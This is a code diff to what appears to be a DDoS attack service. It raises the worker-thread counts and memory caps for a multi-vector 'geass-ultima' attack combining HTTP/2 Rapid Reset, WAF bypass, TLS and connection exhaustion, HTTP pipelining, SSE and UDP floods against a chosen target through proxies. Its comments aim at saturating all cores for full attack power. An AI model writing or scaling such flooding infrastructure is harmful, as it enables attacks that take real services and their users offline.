@@ -205,24 +205,29 @@ const CPU_COUNT = Math.max(1, os.cpus().length);
 
 // ── OOM Guard — cap workers per pool to prevent container OOM kill ─────────
 // DETECTION: REPLIT_DEPLOYMENT is set ONLY in deployed (production) containers.
-// Replit deployed containers: 1-2 vCPU, ~512MB–2GB RAM available to the process.
+// Deployed (production): 8 vCPU / 32GB RAM dedicated container.
+// Dev (workspace):       shared container, ~2-4GB available.
 // Each Node.js worker thread loads the full attack-worker bundle (~8.9MB compiled)
-// and uses ~80-150MB RAM at runtime. With heap cap (see below), peak is ~256MB each.
-// Budget: 2GB container − 500MB main process = ~1.5GB for workers → safe max ~6 workers.
-// More workers = immediate OOM kill → process dies → ALL attacks fail until restart.
+// and uses ~100-200MB RAM at runtime (I/O-bound, rarely hits heap ceiling).
+// With 512MB heap cap: 64 workers × 512MB = 32GB theoretical; actual ~6-13GB.
+// Without a cap: geass-ultima's old formula created 264 worker requests → OOM kill
+// → process dies → ALL attacks fail until restart.
 const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);
 
-// Max workers per pool: deployed=4 (memory safe), dev=3 (always was 3).
-const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 4 : 3;
+// Max workers per pool:
+//   Deployed (8 vCPU / 32GB): 8 workers per pool = 1 per vCPU (saturates all cores).
+//   Dev (shared container):   3 workers (safe on ~2GB shared).
+const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 8 : 3;
 
 // Dev threads per worker: 256 — stays within safe socket-buffer RAM.
 const DEV_MAX_THREADS = 256;
 
 // Global total worker cap — applies in BOTH dev and prod.
-// Prod: 12 workers × 256MB heap cap = 3GB max theoretical; actual ~800MB–1.5GB (I/O-bound).
+// Prod: 64 workers × 512MB heap cap = 32GB theoretical; actual ~100-200MB each (I/O-bound)
+//       → ~6.4-12.8GB actual RAM. Safe on 32GB with 8vCPU Replit deployment.
 // Dev:  48 workers (same as before).
 let _activeWorkers = 0;
-const MAX_TOTAL_WORKERS = IS_DEPLOYED ? 12 : 48;
+const MAX_TOTAL_WORKERS = IS_DEPLOYED ? 64 : 48;
 
 // ── Webhook ────────────────────────────────────────────────────────────────
 async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
@@ -775,12 +780,12 @@ function spawnPool(
         : threadsPerWorker;
 
       // Heap cap per worker:
-      // Deployed (1-2GB container): 256MB → 12 workers × 256 = 3GB theoretical max;
-      //   actual usage ~80-150MB (I/O-bound workers rarely hit the ceiling).
-      // Dev (shared container):     128MB → same as before.
+      // Deployed (8 vCPU / 32GB): 512MB → 64 workers × 512MB = 32GB theoretical max;
+      //   actual usage ~100-200MB (I/O-bound workers rarely hit the ceiling).
+      // Dev (shared container):   128MB → same as before.
       const workerOpts: import("worker_threads").WorkerOptions = {
         workerData: { method, target, port, threads: t, proxies, ...(sni ? { sni } : {}) },
-        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 256 : 128 },
+        resourceLimits: { maxOldGenerationSizeMb: IS_DEPLOYED ? 512 : 128 },
       };
       const w = new Worker(WORKER_FILE, workerOpts);
       _activeWorkers++;
@@ -1383,21 +1388,21 @@ async function runAttackWorkers(
   // ─────────────────────────────────────────────────────────────────────────
   if (method === "geass-ultima") {
     // OOM-safe worker counts for geass-ultima.
-    // In deploy: 1 worker per vector → 11 total (within MAX_TOTAL_WORKERS=12 cap).
-    //   Each worker still opens hundreds/thousands of async connections → full attack power.
-    //   Old formula (W(4) = 24 workers × 11 pools = 264 requested → OOM kills process).
-    // In dev: CPU_COUNT workers per pool, capped by global MAX_TOTAL_WORKERS=48.
-    const W = (base: number) => IS_DEPLOYED ? 1 : Math.max(base, CPU_COUNT);
+    // Deployed (8 vCPU / 32GB): 6 workers per stateless pool.
+    //   6×9 stateless pools + 1×4 socket-holding pools = ~58 total → within MAX_TOTAL_WORKERS=64.
+    //   All 11 vectors launch. Old formula (W(4)=24 per pool × 11 = 264 workers → OOM).
+    // Dev: CPU_COUNT workers per pool, capped by global MAX_TOTAL_WORKERS=48.
+    const W = (base: number) => IS_DEPLOYED ? Math.min(CPU_COUNT, 6) : Math.max(base, CPU_COUNT);
 
-    const rrW    = W(4);   // Rapid Reset Ultra   — 1 worker in deploy, CPU_COUNT in dev
-    const wafW   = W(3);   // WAF Bypass
-    const h2W    = W(4);   // H2 Storm (6 sub-vectors)
-    const appW   = W(3);   // App Smart Flood
-    const tlsW   = IS_DEPLOYED ? 1 : 1;   // TLS Exhaust — 1 worker always (socket-holding)
-    const connW  = IS_DEPLOYED ? 1 : 1;   // Conn Flood  — 1 worker always
-    const pipeW  = W(4);   // HTTP Pipeline       — stateless, highest throughput
-    const sseW   = 1;      // SSE Exhaust         — 1 worker always (persistent conn hold)
-    const udpW   = 1;      // UDP Flood           — 1 worker always (single raw socket pool)
+    const rrW    = W(4);   // Rapid Reset Ultra   — stateless, scales well: 6 in deploy
+    const wafW   = W(3);   // WAF Bypass          — stateless per request: 6 in deploy
+    const h2W    = W(4);   // H2 Storm (6 sub-v)  — stateless framing: 6 in deploy
+    const appW   = W(3);   // App Smart Flood     — adaptive L7: 6 in deploy
+    const tlsW   = 1;      // TLS Exhaust         — socket-holding (1 is enough, holds many)
+    const connW  = 1;      // Conn Flood          — socket-holding (1 is enough)
+    const pipeW  = W(4);   // HTTP Pipeline       — stateless, highest throughput: 6 in deploy
+    const sseW   = 1;      // SSE Exhaust         — persistent conn hold: 1 is enough
+    const udpW   = 1;      // UDP Flood           — single raw socket pool per worker
 
     const rrT    = Math.max(800,  Math.round(threads * 0.55)); // ★★★★★ Rapid Reset (highest priority)
     const wafT   = Math.max(600,  Math.round(threads * 0.45)); // ★★★★ WAF Bypass
